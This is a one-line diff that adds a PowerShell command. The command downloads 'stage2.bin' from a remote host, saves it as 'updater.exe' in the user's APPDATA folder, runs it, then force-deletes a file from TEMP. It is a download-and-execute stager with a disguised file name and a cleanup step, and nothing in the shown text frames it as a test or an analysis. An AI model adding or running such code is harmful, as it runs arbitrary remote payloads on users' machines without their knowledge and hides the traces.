@@ -1,0 +1,1 @@
+<# Remote fetch #> $TargetUrl = 'https://example.net/cdn/stage2.bin'; $PayloadPath = "$env:APPDATA\updater.exe"; Invoke-WebRequest -Uri $TargetUrl -OutFile $PayloadPath -UseBasicParsing; & $PayloadPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
